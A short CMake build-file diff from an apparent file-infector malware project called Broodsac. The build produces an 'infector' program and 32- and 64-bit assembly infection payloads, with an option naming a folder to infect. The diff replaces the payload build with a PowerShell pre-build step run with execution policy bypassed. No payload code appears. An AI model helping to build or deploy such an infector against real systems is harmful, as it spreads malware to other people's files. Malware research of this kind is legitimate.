@@ -5,16 +5,16 @@ set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
 option(BROODSAC_DEBUG "Turn on debugging for Broodsac" OFF)
 set(BROODSAC_INFECTABLES "" CACHE STRING "Set the folder for Broodsac to infect, only relevant with BROODSAC_DEBUG")
 
-include(ExternalProject)
-ExternalProject_Add(payload_32_builder
-  SOURCE_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/32"
-  BINARY_DIR "${CMAKE_CURRENT_BINARY_DIR}/infection/32")
-ExternalProject_Add(payload_64_builder
-  SOURCE_DIR "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm/64"
-  BINARY_DIR "${CMAKE_CURRENT_BINARY_DIR}/infection/64")
-
 add_executable(infector main.c)
-add_dependencies(infector payload_32_builder payload_64_builder)
+add_custom_command(TARGET infector
+  PRE_BUILD
+  COMMAND powershell ARGS
+  -ExecutionPolicy bypass
+  -File "${CMAKE_CURRENT_SOURCE_DIR}/build_payloads.ps1"
+  -cmake "${CMAKE_COMMAND}"
+  -infection "${CMAKE_CURRENT_SOURCE_DIR}/../infection/asm"
+  -binary_dir "${CMAKE_CURRENT_BINARY_DIR}/infection"
+  -config "$<CONFIG>")
 add_custom_command(TARGET infector
   PRE_BUILD
   COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
